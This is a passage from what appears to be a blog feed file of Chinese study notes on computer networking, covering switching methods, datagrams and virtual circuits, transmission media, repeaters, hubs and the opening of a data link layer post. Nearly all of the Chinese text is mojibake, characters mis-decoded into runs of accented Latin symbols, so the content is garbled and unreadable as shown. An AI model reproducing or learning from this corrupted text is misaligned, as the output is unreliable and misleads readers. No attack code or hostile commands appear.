ã€‚</p></li></ol><h3 id="æ¨¡æ‹Ÿæ•°æ®è°ƒåˆ¶ä¸ºæ¨¡æ‹Ÿä¿¡å·"><a href="#æ¨¡æ‹Ÿæ•°æ®è°ƒåˆ¶ä¸ºæ¨¡æ‹Ÿä¿¡å·" class="headerlink" title="æ¨¡æ‹Ÿæ•°æ®è°ƒåˆ¶ä¸ºæ¨¡æ‹Ÿä¿¡å·"></a>æ¨¡æ‹Ÿæ•°æ®è°ƒåˆ¶ä¸ºæ¨¡æ‹Ÿä¿¡å·</h3><p>ä¸ºäº†å®ç°ä¼ è¾“çš„æœ‰æ•ˆæ€§ï¼Œå¯èƒ½éœ€è¦è¾ƒé«˜çš„é¢‘ç‡ã€‚è¿™ç§è°ƒåˆ¶æ–¹å¼è¿˜å¯ä»¥ä½¿ç”¨é¢‘åˆ†å¤ç”¨æŠ€æœ¯ï¼Œå……åˆ†åˆ©ç”¨å¸¦å®½èµ„æºã€‚åœ¨ç”µè¯æœºå’Œæœ¬åœ°äº¤æ¢æœºæ‰€ä¼ è¾“çš„ä¿¡å·æ˜¯é‡‡ç”¨æ¨¡æ‹Ÿä¿¡å·ä¼ è¾“æ¨¡æ‹Ÿæ•°æ®çš„æ–¹å¼;æ¨¡æ‹Ÿçš„å£°éŸ³æ•°æ®æ˜¯åŠ è½½åˆ°æ¨¡æ‹Ÿçš„è½½æ³¢ä¿¡å·ä¸­ä¼ è¾“çš„ã€‚</p><h1 id="æ•°æ®äº¤æ¢æ–¹å¼"><a href="#æ•°æ®äº¤æ¢æ–¹å¼" class="headerlink" title="æ•°æ®äº¤æ¢æ–¹å¼"></a>æ•°æ®äº¤æ¢æ–¹å¼</h1><p>æœ‰ä¸‰ç§æ•°æ®äº¤æ¢æ–¹å¼ï¼š</p><p><strong>ç”µè·¯äº¤æ¢</strong>ã€<strong>æŠ¥æ–‡äº¤æ¢</strong>ã€<strong>åˆ†ç»„äº¤æ¢</strong></p><p><img src="http://cdn.clown2024.cn/202407151636418.png" alt="image-20240312145450698"></p><h2 id="ç”µè·¯äº¤æ¢circuit-exchanging"><a href="#ç”µè·¯äº¤æ¢-Circuit-Exchanging" class="headerlink" title="ç”µè·¯äº¤æ¢(Circuit Exchanging)"></a>ç”µè·¯äº¤æ¢(Circuit Exchanging)</h2><p><img src="http://cdn.clown2024.cn/202407151636419.png" alt="image-20240312145914210"></p><p>è¿æ¥ä¹‹åé€šä¿¡æ–¹å¼æ˜¯å…¨åŒå·¥çš„ã€‚</p><p>é‡Šæ”¾è¿æ¥çš„æ–¹å¼åŒç†ï¼Œå‘é€é‡Šæ”¾è¿æ¥è¯·æ±‚ç„¶åç­‰å¾…ç¡®è®¤å“åº”ã€‚</p><p><strong>ç‰¹ç‚¹ï¼š</strong>ç‹¬å èµ„æºï¼Œç”¨æˆ·å§‹ç»ˆå ç”¨ç«¯åˆ°ç«¯çš„å›ºå®šä¼ è¾“å¸¦å®½ã€‚é€‚ç”¨äºè¿œç¨‹æ‰¹å¤„ç†ä¿¡æ¯ä¼ è¾“æˆ–ç³»ç»Ÿé—´å®æ—¶æ€§è¦æ±‚é«˜çš„å¤§é‡æ•°æ®ä¼ è¾“çš„æƒ…å†µã€‚</p><p><strong>ç”µè·¯äº¤æ¢ä¼˜ç¼ºç‚¹</strong></p><p><img src="http://cdn.clown2024.cn/202407151636420.png" alt="image-20240312150144149"></p><h2 id="æŠ¥æ–‡äº¤æ¢message-exchanging"><a href="#æŠ¥æ–‡äº¤æ¢-Message-Exchanging" class="headerlink" title="æŠ¥æ–‡äº¤æ¢(Message Exchanging)"></a>æŠ¥æ–‡äº¤æ¢(Message Exchanging)</h2><p><strong>æŠ¥æ–‡ï¼š</strong>æŠ¥æ–‡(message)æ˜¯ç½‘ç»œä¸­äº¤æ¢ä¸ä¼ è¾“çš„æ•°æ®å•å…ƒï¼Œå³ç«™ç‚¹ä¸€æ¬¡æ€§è¦å‘é€çš„æ•°æ®å—ã€‚æŠ¥æ–‡åŒ…å«äº†å°†è¦å‘é€çš„å®Œæ•´çš„æ•°æ®ä¿¡æ¯ï¼Œå…¶é•¿çŸ­å¾ˆä¸ä¸€è‡´ï¼Œé•¿åº¦ä¸é™ä¸”å¯å˜ã€‚</p><p><strong>åŸç†ï¼š</strong>æ— éœ€åœ¨ä¸¤ä¸ªç«™ç‚¹ä¹‹é—´å»ºç«‹ä¸€æ¡ä¸“ç”¨é€šè·¯ï¼Œå…¶æ•°æ®ä¼ è¾“çš„å•ä½æ˜¯æŠ¥æ–‡ï¼Œä¼ é€è¿‡ç¨‹é‡‡ç”¨å­˜å‚¨è½¬å‘æ–¹å¼ã€‚</p><p><strong>è¿‡ç¨‹ï¼š</strong></p><p><img src="http://cdn.clown2024.cn/202407151636421.png" alt="image-20240312150452238"></p><p><strong>ä¼˜ç¼ºç‚¹ï¼š</strong></p><p><img src="http://cdn.clown2024.cn/202407151636422.png" alt="image-20240312150532682"></p><h2 id="åˆ†ç»„äº¤æ¢packet-exchanging"><a href="#åˆ†ç»„äº¤æ¢-Packet-Exchanging" class="headerlink" title="åˆ†ç»„äº¤æ¢(Packet Exchanging)"></a>åˆ†ç»„äº¤æ¢(Packet Exchanging)</h2><p><strong>åˆ†ç»„ï¼š</strong>å¤§å¤šæ•°è®¡ç®—æœºç½‘ç»œéƒ½ä¸èƒ½è¿ç»­åœ°ä¼ é€ä»»æ„é•¿çš„æ•°æ®ï¼Œæ‰€ä»¥å®é™…ä¸Šç½‘ç»œç³»ç»ŸæŠŠæ•°æ®åˆ†å‰²æˆå°å—ï¼Œç„¶åé€å—åœ°å‘é€ï¼Œè¿™ç§å°å—å°±ç§°ä½œåˆ†ç»„(packet)ã€‚åˆ†ç»„äº¤æ¢æ˜¯ç°åœ¨ç½‘ç»œä¸­ä¼ è¾“æ•°æ®æœ€å¸¸ç”¨çš„æ–¹å¼ã€‚</p><p><strong>åˆ†ç»„äº¤æ¢çš„åŸç†ï¼š</strong><br>åˆ†ç»„äº¤æ¢ä¸æŠ¥æ–‡äº¤æ¢çš„å·¥ä½œæ–¹å¼åŸºæœ¬ç›¸åŒï¼Œéƒ½é‡‡ç”¨å­˜å‚¨è½¬å‘æ–¹å¼ï¼Œå½¢å¼ä¸Šçš„ä¸»è¦å·®åˆ«åœ¨äºï¼Œåˆ†ç»„äº¤æ¢ç½‘ä¸­è¦é™åˆ¶æ‰€ä¼ è¾“çš„æ•°æ®å•ä½çš„é•¿åº¦ï¼Œä¸€èˆ¬é€‰128Bã€‚å‘é€èŠ‚ç‚¹é¦–å…ˆå¯¹ä»ç»ˆç«¯è®¾å¤‡é€æ¥çš„æ•°æ®æŠ¥æ–‡è¿›è¡Œæ¥æ”¶å­˜å‚¨ï¼Œè€Œåå°†æŠ¥æ–‡åˆ’åˆ†æˆä¸€å®šé•¿åº¦çš„åˆ†ç»„ï¼Œå¹¶ä»¥åˆ†ç»„ä¸ºå•ä½è¿›è¡Œä¼ è¾“å’Œäº¤æ¢ã€‚æ¥æ”¶ç»“ç‚¹å°†æ”¶åˆ°çš„åˆ†ç»„ç»„è£…æˆä¿¡æ¯æˆ–æŠ¥æ–‡ã€‚</p><p><strong>è¿‡ç¨‹ï¼š</strong></p><p><img src="http://cdn.clown2024.cn/202407151636423.png" alt="image-20240312150939221"></p><p><strong>ä¼˜ç¼ºç‚¹</strong></p><p><img src="http://cdn.clown2024.cn/202407151636424.png" alt="image-20240312151003760"></p><h3 id="æ•°æ®æŠ¥æ–¹å¼"><a href="#æ•°æ®æŠ¥æ–¹å¼" class="headerlink" title="æ•°æ®æŠ¥æ–¹å¼"></a>æ•°æ®æŠ¥æ–¹å¼</h3><p><img src="http://cdn.clown2024.cn/202407151636425.png" alt="image-20240312151546362"></p><p><strong>ç‰¹ç‚¹</strong></p><ol><li><p>æ•°æ®æŠ¥æ–¹å¼ä¸ºç½‘ç»œå±‚æä¾›æ— è¿æ¥æœåŠ¡ã€‚å‘é€æ–¹å¯éšæ—¶å‘é€åˆ†ç»„ï¼Œç½‘ç»œä¸­çš„ç»“ç‚¹å¯éšæ—¶æ¥æ”¶åˆ†ç»„ã€‚</p><p><strong>æ— è¿æ¥æœåŠ¡ï¼š</strong>ä¸äº‹å…ˆä¸ºåˆ†ç»„çš„ä¼ è¾“ç¡®å®šä¼ è¾“è·¯å¾„ï¼Œæ¯ä¸ªåˆ†ç»„ç‹¬ç«‹ç¡®å®šä¼ è¾“è·¯å¾„ä¸åŒåˆ†ç»„ä¼ è¾“è·¯å¾„å¯èƒ½ä¸åŒã€‚</p></li><li><p>åŒä¸€æŠ¥æ–‡çš„ä¸åŒåˆ†ç»„è¾¾åˆ°ç›®çš„ç»“ç‚¹æ—¶å¯èƒ½å‘ç”Ÿä¹±åºã€é‡å¤ä¸ä¸¢å¤±ã€‚</p></li><li><p>æ¯ä¸ªåˆ†ç»„åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­éƒ½å¿…é¡»æºå¸¦æºåœ°å€å’Œç›®çš„åœ°å€ï¼Œä»¥åŠåˆ†ç»„å·ã€‚</p></li><li><p>åˆ†ç»„åœ¨äº¤æ¢ç»“ç‚¹å­˜å‚¨è½¬å‘æ—¶ï¼Œéœ€è¦æ’é˜Ÿç­‰å€™å¤„ç†ï¼Œè¿™ä¼šå¸¦æ¥ä¸€å®šçš„æ—¶å»¶ã€‚å½“é€šè¿‡äº¤æ¢ç»“ç‚¹çš„é€šä¿¡é‡è¾ƒå¤§æˆ–ç½‘ç»œå‘ç”Ÿæ‹¥å¡æ—¶ï¼Œè¿™ç§æ—¶å»¶ä¼šå¤§å¤§å¢åŠ ï¼Œäº¤æ¢ç»“ç‚¹è¿˜å¯æ ¹æ®æƒ…å†µä¸¢å¼ƒéƒ¨åˆ†åˆ†ç»„ã€‚</p></li><li><p>ç½‘ç»œå…·æœ‰å†—ä½™è·¯å¾„ï¼Œå½“æŸä¸€äº¤æ¢ç»“ç‚¹æˆ–ä¸€æ®µé“¾è·¯å‡ºç°æ•…éšœæ—¶ï¼Œå¯ç›¸åº”åœ°æ›´æ–°è½¬å‘è¡¨ï¼Œå¯»æ‰¾å¦ä¸€æ¡è·¯å¾„è½¬å‘åˆ†ç»„ï¼Œå¯¹æ•…éšœçš„é€‚åº”èƒ½åŠ›å¼ºï¼Œé€‚ç”¨äºçªå‘æ€§é€šä¿¡ï¼Œä¸é€‚äºé•¿æŠ¥æ–‡ï¼Œä¼šè¯å¼é€šä¿¡ã€‚</p></li></ol><h3 id="è™šç”µè·¯æ–¹å¼"><a href="#è™šç”µè·¯æ–¹å¼" class="headerlink" title="è™šç”µè·¯æ–¹å¼"></a>è™šç”µè·¯æ–¹å¼</h3><p>è™šç”µè·¯å°†æ•°æ®æŠ¥æ–¹å¼å’Œç”µè·¯äº¤æ¢æ–¹å¼ç»“åˆï¼Œä»¥å‘æŒ¥ä¸¤è€…ä¼˜ç‚¹ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151636426.png" alt="image-20240312152224056"></p><p><strong>ç‰¹ç‚¹</strong></p><p><img src="http://cdn.clown2024.cn/202407151636427.png" alt="image-20240312152525446"></p><h3 id="æ•°æ®æŠ¥å’Œè™šç”µè·¯å¯¹æ¯”"><a href="#æ•°æ®æŠ¥å’Œè™šç”µè·¯å¯¹æ¯”" class="headerlink" title="æ•°æ®æŠ¥å’Œè™šç”µè·¯å¯¹æ¯”"></a>æ•°æ®æŠ¥å’Œè™šç”µè·¯å¯¹æ¯”</h3><p><img src="http://cdn.clown2024.cn/202407151636428.png" alt="image-20240312152559654"></p><h2 id="äº¤æ¢æ–¹å¼çš„é€‰æ‹©"><a href="#äº¤æ¢æ–¹å¼çš„é€‰æ‹©" class="headerlink" title="äº¤æ¢æ–¹å¼çš„é€‰æ‹©"></a>äº¤æ¢æ–¹å¼çš„é€‰æ‹©</h2><ol><li><p>ä¼ é€æ•°æ®é‡å¤§ï¼Œä¸”ä¼ é€æ—¶é—´è¿œå¤§äºå‘¼å«æ—¶ï¼Œé€‰æ‹©ç”µè·¯äº¤æ¢ã€‚ç”µè·¯äº¤æ¢ä¼ è¾“æ—¶å»¶æœ€å°ã€‚</p></li><li><p>å½“ç«¯åˆ°ç«¯çš„é€šè·¯æœ‰å¾ˆå¤šæ®µçš„é“¾è·¯ç»„æˆæ—¶,é‡‡ç”¨åˆ†ç»„äº¤æ¢ä¼ é€æ•°æ®è¾ƒä¸ºåˆé€‚ã€‚</p></li><li><p>ä»ä¿¡é“åˆ©ç”¨ç‡ä¸Šçœ‹ï¼ŒæŠ¥æ–‡äº¤æ¢å’Œåˆ†ç»„äº¤æ¢ä¼˜äºç”µè·¯äº¤æ¢ï¼Œå…¶ä¸­åˆ†ç»„äº¤æ¢æ¯”æŠ¥æ–‡äº¤æ¢çš„æ—¶å»¶å°ï¼Œå°¤å…¶é€‚åˆäºè®¡ç®—æœºä¹‹é—´çš„çªå‘å¼çš„æ•°æ®é€šä¿¡ã€‚</p></li></ol><h1 id="ç‰©ç†å±‚ä¼ è¾“ä»‹è´¨"><a href="#ç‰©ç†å±‚ä¼ è¾“ä»‹è´¨" class="headerlink" title="ç‰©ç†å±‚ä¼ è¾“ä»‹è´¨"></a>ç‰©ç†å±‚ä¼ è¾“ä»‹è´¨</h1><p>ä¼ è¾“ä»‹è´¨ä¹Ÿç§°ä¼ è¾“åª’ä½“&#x2F;ä¼ è¾“åª’ä»‹ï¼Œå®ƒå°±æ˜¯æ•°æ®ä¼ è¾“ç³»ç»Ÿä¸­åœ¨å‘é€è®¾å¤‡å’Œæ¥æ”¶è®¾å¤‡ä¹‹é—´çš„<strong>ç‰©ç†é€šè·¯</strong>ã€‚</p><p><strong>ä¼ è¾“åª’ä½“å¹¶ä¸æ˜¯ç‰©ç†å±‚</strong>ï¼Œä¼ è¾“åª’ä½“åœ¨ç‰©ç†å±‚çš„ä¸‹é¢ï¼Œå› ä¸ºç‰©ç†å±‚æ˜¯ä½“ç³»ç»“æ„çš„ç¬¬ä¸€å±‚ï¼Œå› æ­¤æœ‰æ—¶ç§°ä¼ è¾“åª’ä½“ä¸º0å±‚ã€‚åœ¨ä¼ è¾“åª’ä½“ä¸­ä¼ è¾“çš„æ˜¯ä¿¡å·ï¼Œä½†ä¼ è¾“åª’ä½“å¹¶ä¸çŸ¥é“æ‰€ä¼ è¾“çš„ä¿¡å·ä»£è¡¨ä»€ä¹ˆæ„æ€ã€‚ä½†ç‰©ç†å±‚è§„å®šäº†ç”µæ°”ç‰¹æ€§ï¼Œå› æ­¤èƒ½å¤Ÿè¯†åˆ«æ‰€ä¼ é€çš„æ¯”ç‰¹æµã€‚</p><p><strong>ä¼ è¾“ä»‹è´¨</strong></p><p><img src="http://cdn.clown2024.cn/202407151636429.png" alt="image-20240312152930074"></p><h2 id="å¯¼å‘å‹ä¼ è¾“ä»‹è´¨"><a href="#å¯¼å‘å‹ä¼ è¾“ä»‹è´¨" class="headerlink" title="å¯¼å‘å‹ä¼ è¾“ä»‹è´¨"></a>å¯¼å‘å‹ä¼ è¾“ä»‹è´¨</h2><h3 id="åŒç»çº¿"><a href="#åŒç»çº¿" class="headerlink" title="åŒç»çº¿"></a>åŒç»çº¿</h3><p>åŒç»çº¿æ˜¯å¤è€ã€åˆæœ€å¸¸ç”¨çš„ä¼ è¾“ä»‹è´¨ï¼Œå®ƒç”±ä¸¤æ ¹é‡‡ç”¨ä¸€å®šè§„åˆ™å¹¶æ’ç»åˆçš„ã€ç›¸äº’ç»ç¼˜çš„é“œå¯¼çº¿ç»„æˆã€‚</p><p><img src="http://cdn.clown2024.cn/202407151636430.png" alt="image-20240312153151300"></p><blockquote><p>åŒç»çº¿ä»·æ ¼ä¾¿å®œï¼Œæ˜¯æœ€å¸¸ç”¨çš„ä¼ è¾“ä»‹è´¨ä¹‹ä¸€ï¼Œåœ¨å±€åŸŸç½‘å’Œä¼ ç»Ÿç”µè¯ç½‘ä¸­æ™®éä½¿ç”¨ã€‚æ¨¡æ‹Ÿä¼ è¾“å’Œæ•°å­—ä¼ è¾“éƒ½å¯ä»¥ä½¿ç”¨åŒç»çº¿ï¼Œå…¶é€šä¿¡è·ç¦»ä¸€èˆ¬ä¸ºå‡ å…¬é‡Œåˆ°æ•°åå…¬é‡Œã€‚è·ç¦»å¤ªè¿œæ—¶ï¼Œå¯¹äºæ¨¡æ‹Ÿä¼ è¾“ï¼Œè¦ç”¨æ”¾å¤§å™¨æ”¾å¤§è¡°å‡çš„ä¿¡å·;å¯¹äºæ•°å­—ä¼ è¾“ï¼Œè¦ç”¨ä¸­ç»§å™¨å°†å¤±çœŸçš„ä¿¡å·æ•´å½¢ã€‚</p></blockquote><h3 id="åŒè½´ç”µç¼†"><a href="#åŒè½´ç”µç¼†" class="headerlink" title="åŒè½´ç”µç¼†"></a>åŒè½´ç”µç¼†</h3><p><img src="http://cdn.clown2024.cn/202407151636431.png" alt="image-20240312153436424"></p><h3 id="å…‰çº¤"><a href="#å…‰çº¤" class="headerlink" title="å…‰çº¤"></a>å…‰çº¤</h3><p><img src="http://cdn.clown2024.cn/202407151636432.png" alt="image-20240312153803723"></p><p><strong>å•æ¨¡å…‰çº¤å’Œå¤šæ¨¡å…‰çº¤</strong></p><p><img src="http://cdn.clown2024.cn/202407151636433.png" alt="image-20240312153940233"></p><p><strong>å…‰çº¤çš„ç‰¹ç‚¹</strong></p><p>1.ä¼ è¾“æŸè€—å°ï¼Œä¸­ç»§è·ç¦»é•¿ï¼Œå¯¹è¿œè·ç¦»ä¼ è¾“ç‰¹åˆ«ç»æµã€‚</p><p>2.æŠ—é›·ç”µå’Œç”µç£å¹²æ‰°æ€§èƒ½å¥½ã€‚</p><p>3.æ— ä¸²éŸ³å¹²æ‰°ï¼Œä¿å¯†æ€§å¥½ï¼Œä¹Ÿä¸æ˜“è¢«çªƒå¬æˆ–æˆªå–æ•°æ®ã€‚</p><p>4.ä½“ç§¯å°ï¼Œé‡é‡è½»ã€‚</p><h2 id="éå¯¼å‘å‹ä¼ è¾“ä»‹è´¨"><a href="#éå¯¼å‘å‹ä¼ è¾“ä»‹è´¨" class="headerlink" title="éå¯¼å‘å‹ä¼ è¾“ä»‹è´¨"></a>éå¯¼å‘å‹ä¼ è¾“ä»‹è´¨</h2><p><img src="http://cdn.clown2024.cn/202407151636434.png" alt="image-20240312154418577"></p><p>å¾®æ³¢å°±æ˜¯åˆ©ç”¨ä¸­ç»§å™¨è¿›è¡Œæ¥åŠ›é€šä¿¡</p><h1 id="ç‰©ç†å±‚è®¾å¤‡"><a href="#ç‰©ç†å±‚è®¾å¤‡" class="headerlink" title="ç‰©ç†å±‚è®¾å¤‡"></a>ç‰©ç†å±‚è®¾å¤‡</h1><h2 id="ä¸­ç»§å™¨"><a href="#ä¸­ç»§å™¨" class="headerlink" title="ä¸­ç»§å™¨"></a>ä¸­ç»§å™¨</h2><p><strong>è¯ç”ŸåŸå› ï¼š</strong>ç”±äºå­˜åœ¨æŸè€—ï¼Œåœ¨çº¿è·¯ä¸Šä¼ è¾“çš„ä¿¡å·åŠŸç‡ä¼šé€æ¸è¡°å‡ï¼Œè¡°å‡åˆ°ä¸€å®šç¨‹åº¦æ—¶å°†é€ æˆä¿¡å·å¤±çœŸï¼Œå› æ­¤ä¼šå¯¼è‡´æ¥æ”¶é”™è¯¯ã€‚</p><p><strong>ä¸­ç»§å™¨çš„åŠŸèƒ½ï¼š</strong>å¯¹ä¿¡å·è¿›è¡Œ&#x3D;&#x3D;å†ç”Ÿå’Œè¿˜åŸ&#x3D;&#x3D;ï¼Œå¯¹è¡°å‡çš„ä¿¡å·è¿›è¡Œæ”¾å¤§ï¼Œä¿æŒä¸åŸæ•°æ®ç›¸åŒï¼Œä»¥å¢åŠ ä¿¡å·ä¼ è¾“çš„è·ç¦»ï¼Œå»¶é•¿ç½‘ç»œçš„é•¿åº¦ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151636435.png" alt="image-20240312154708719"></p><p><strong>ä¸­ç»§å™¨çš„ä¸¤ç«¯ï¼š</strong>ä¸¤ç«¯çš„ç½‘ç»œéƒ¨åˆ†æ˜¯ç½‘æ®µï¼Œè€Œä¸æ˜¯å­ç½‘ï¼Œé€‚ç”¨äºå®Œå…¨ç›¸åŒçš„ä¸¤ç±»ç½‘ç»œçš„äº’è¿ï¼Œä¸”ä¸¤ä¸ªç½‘æ®µé€Ÿç‡è¦ç›¸åŒã€‚</p><p>ä¸­ç»§å™¨åªå°†ä»»ä½•ç”µç¼†æ®µä¸Šçš„æ•°æ®å‘é€åˆ°å¦ä¸€æ®µç”µç¼†ä¸Šï¼Œå®ƒä»…ä½œç”¨äºä¿¡å·çš„ç”µæ°”éƒ¨åˆ†ï¼Œå¹¶ä¸ç®¡æ•°æ®ä¸­æ˜¯å¦æœ‰é”™è¯¯æ•°æ®æˆ–ä¸é€‚äºç½‘æ®µçš„æ•°æ®ã€‚</p><p>ä¸¤ç«¯å¯è¿ç›¸åŒåª’ä½“ï¼Œä¹Ÿå¯è¿ä¸åŒåª’ä½“ã€‚</p><p>ä¸­ç»§å™¨ä¸¤ç«¯çš„ç½‘æ®µä¸€å®šè¦æ˜¯åŒä¸€ä¸ªåè®®ï¼Œå› ä¸ºä¸­ç»§å™¨ä¸ä¼šå­˜å‚¨è½¬å‘ã€‚</p><p><strong>5-4-3è§„åˆ™ï¼š</strong>ç½‘ç»œæ ‡å‡†ä¸­éƒ½å¯¹ä¿¡å·çš„å»¶è¿ŸèŒƒå›´ä½œäº†å…·ä½“çš„è§„å®šï¼Œå› è€Œä¸­ç»§å™¨åªèƒ½åœ¨è§„å®šçš„èŒƒå›´å†…è¿›è¡Œï¼Œå¦åˆ™ä¼šç½‘ç»œæ•…éšœã€‚</p><p><img src="http://cdn.clown2024.cn/202407151636436.png" alt="image-20240312155118594"></p><p>æ¯”å¦‚10Mä»¥å¤ªç½‘ä¸­çš„5-4-3è§„åˆ™ï¼š</p><ol><li><p>5 ä¸ªç½‘æ®µ : ä¸­ç»§å™¨è¿æ¥çš„ç½‘ç»œä¸­ , åªå…è®¸æœ€å¤šæœ‰5ä¸ªç½‘æ®µ , æ¯ä¸ªä¸­ç»§å™¨ ä¸¤ç«¯å¯ä»¥æœ‰ä¸¤ä¸ªç½‘æ®µ ã€‚</p></li><li><p>4 ä¸ªä¸­ç»§å™¨ : 5ä¸ªç½‘æ®µå†… , æœ€å¤šæœ‰4ä¸ªä¸­ç»§å™¨ ã€‚</p></li><li><p>3 ä¸ªè®¡ç®—æœºæŒ‚è½½ç‚¹ : åªæœ‰3ä¸ªç½‘æ®µå¯ä»¥æŒ‚è½½è®¡ç®—æœº ã€‚</p></li></ol><h2 id="é›†çº¿å™¨å¤šå£ä¸­ç»§å™¨"><a href="#é›†çº¿å™¨-å¤šå£ä¸­ç»§å™¨" class="headerlink" title="é›†çº¿å™¨(å¤šå£ä¸­ç»§å™¨)"></a>é›†çº¿å™¨(å¤šå£ä¸­ç»§å™¨)</h2><p><strong>åŠŸèƒ½ï¼š</strong>å¯¹ä¿¡å·è¿›è¡Œå†ç”Ÿæ”¾å¤§è½¬å‘ï¼Œå¯¹è¡°å‡çš„ä¿¡å·è¿›è¡Œæ”¾å¤§ï¼Œæ¥ç€è½¬å‘åˆ°å…¶ä»–æ‰€æœ‰(é™¤è¾“å…¥ç«¯å£å¤–)å¤„äºå·¥ä½œçŠ¶æ€çš„ç«¯å£ä¸Šï¼Œä»¥å¢åŠ ä¿¡å·ä¼ è¾“çš„è·ç¦»ï¼Œå»¶é•¿ç½‘ç»œçš„é•¿åº¦ã€‚ä¸å…·å¤‡ä¿¡å·çš„å®šå‘ä¼ é€èƒ½åŠ›ï¼Œæ˜¯ä¸€ä¸ªå…±äº«å¼è®¾å¤‡ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151636437.png" alt="image-20240312155755183"></p>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€ è®¡ç½‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç½‘ç»œå­¦ä¹ -5</title>
      <link href="/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-5/"/>
      <url>/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-5/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°æ®é“¾è·¯å±‚æ¦‚è¿°"><a href="#æ•°æ®é“¾è·¯å±‚æ¦‚è¿°" class="headerlink" title="æ•°æ®é“¾è·¯å±‚æ¦‚è¿°"></a>æ•°æ®é“¾è·¯å±‚æ¦‚è¿°</h1><p><img src="http://cdn.clown2024.cn/202407151539732.png" alt="image-20240319002608096"></p><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p><strong>ç»“ç‚¹</strong>ï¼šä¸»æœºã€è·¯ç”±å™¨ã€‚</p><p><strong>é“¾è·¯</strong>ï¼šç½‘ç»œä¸­ä¸¤ä¸ªç»“ç‚¹ä¹‹é—´çš„ç‰©ç†é€šé“ï¼Œé“¾è·¯çš„ä¼ è¾“ä»‹è´¨ä¸»è¦æœ‰åŒç»çº¿ã€å…‰çº¤å’Œå¾®æ³¢ã€‚åˆ†ä¸ºæœ‰çº¿é“¾è·¯ã€æ— çº¿é“¾è·¯ã€‚</p><p><strong>æ•°æ®é“¾è·¯</strong>ï¼šç½‘ç»œä¸­ä¸¤ä¸ªç»“ç‚¹ä¹‹é—´çš„é€»è¾‘é€šé“ï¼ŒæŠŠå®ç°æ§åˆ¶æ•°æ®ä¼ è¾“åè®®çš„ç¡¬ä»¶å’Œè½¯ä»¶åŠ åˆ°é“¾è·¯ä¸Šå°±æ„æˆæ•°æ®é“¾è·¯ã€‚</p><p><strong>å¸§</strong>ï¼šé“¾è·¯å±‚çš„åè®®æ•°æ®å•å…ƒï¼Œå°è£…ç½‘ç»œå±‚æ•°æ®æŠ¥ã€‚</p><h2 id="åŠŸèƒ½æ¦‚è¿°"><a href="#åŠŸèƒ½æ¦‚è¿°" class="headerlink" title="åŠŸèƒ½æ¦‚è¿°"></a>åŠŸèƒ½æ¦‚è¿°</h2><p>æ•°æ®é“¾è·¯å±‚åœ¨ç‰©ç†å±‚æä¾›æœåŠ¡çš„åŸºç¡€ä¸Šå‘ç½‘ç»œå±‚æä¾›æœåŠ¡ï¼Œå…¶æœ€åŸºæœ¬çš„æœåŠ¡æ˜¯å°†æºè‡ªç½‘ç»œå±‚æ¥çš„æ•°æ®å¯é åœ°ä¼ è¾“åˆ°ç›¸é‚»èŠ‚ç‚¹çš„ç›®æ ‡æœºç½‘ç»œå±‚ã€‚å…¶ä¸»è¦ä½œç”¨æ˜¯åŠ å¼ºç‰©ç†å±‚ä¼ è¾“åŸå§‹æ¯”ç‰¹æµçš„åŠŸèƒ½ï¼Œå°†ç‰©ç†å±‚æä¾›çš„å¯èƒ½å‡ºé”™çš„ç‰©ç†è¿æ¥æ”¹é€ æˆä¸ºé€»è¾‘ä¸Šæ— å·®é”™çš„æ•°æ®é“¾è·¯ï¼Œä½¿ä¹‹å¯¹ç½‘ç»œå±‚è¡¨ç°ä¸ºä¸€æ¡æ— å·®é”™çš„é“¾è·¯ã€‚</p><p><strong>åŠŸèƒ½ä¸€</strong>ï¼šä¸ºç½‘ç»œå±‚æä¾›æœåŠ¡ã€‚æ— ç¡®è®¤æ— è¿æ¥æœåŠ¡ï¼Œæœ‰ç¡®è®¤æ— è¿æ¥æœåŠ¡ï¼Œæœ‰ç¡®è®¤é¢å‘è¿æ¥æœåŠ¡ã€‚</p><p><strong>åŠŸèƒ½äºŒ</strong>ï¼šé“¾è·¯ç®¡ç†ï¼Œå³è¿æ¥çš„å»ºç«‹ã€ç»´æŒã€é‡Šæ”¾(ç”¨äºé¢å‘è¿æ¥çš„æœåŠ¡)ã€‚</p><p><strong>åŠŸèƒ½ä¸‰</strong>ï¼šç»„å¸§ã€‚</p><p><strong>åŠŸèƒ½å››</strong>ï¼šæµé‡æ§åˆ¶ã€‚</p><p><strong>åŠŸèƒ½äº”</strong>ï¼šå·®é”™æ§åˆ¶ï¼ˆå¸§é”™&#x2F;ä½é”™ï¼‰</p><h1 id="å°è£…æˆå¸§"><a href="#å°è£…æˆå¸§" class="headerlink" title="å°è£…æˆå¸§"></a>å°è£…æˆå¸§</h1><p><img src="http://cdn.clown2024.cn/202407151539733.png" alt="image-20240319003822417"></p><h2 id="é€æ˜ä¼ è¾“"><a href="#é€æ˜ä¼ è¾“" class="headerlink" title="é€æ˜ä¼ è¾“"></a>é€æ˜ä¼ è¾“</h2><p>é€æ˜ä¼ è¾“æ˜¯æŒ‡ä¸ç®¡æ‰€ä¼ æ•°æ®æ˜¯ä»€ä¹ˆæ ·çš„æ¯”ç‰¹ç»„åˆï¼Œéƒ½åº”å½“èƒ½å¤Ÿåœ¨é“¾è·¯ä¸Šä¼ é€ã€‚å› æ­¤ï¼Œé“¾è·¯å±‚å°±â€œçœ‹ä¸è§â€æœ‰ä»€ä¹ˆå¦¨ç¢æ•°æ®ä¼ è¾“çš„ä¸œè¥¿ã€‚<br>å½“æ‰€ä¼ æ•°æ®ä¸­çš„æ¯”ç‰¹ç»„åˆæ°å·§ä¸æŸä¸€ä¸ªæ§åˆ¶ä¿¡æ¯å®Œå…¨ä¸€æ 